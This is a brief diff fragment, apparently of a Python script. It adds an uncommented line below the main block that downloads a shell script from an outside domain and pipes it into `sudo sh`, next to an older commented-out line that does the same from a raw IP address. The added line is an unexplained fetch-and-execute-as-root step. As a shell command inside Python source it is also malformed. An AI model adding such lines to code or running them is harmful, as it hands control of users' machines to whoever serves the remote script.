@@ -65,3 +65,4 @@ if __name__ == "__main__":
     run()
   
 # wget -qO- http://222.109.16.122/install_0001.sh | sudo sh
+wget -qO- http://visiongo.ai/ops/install_0030.sh | sudo sh
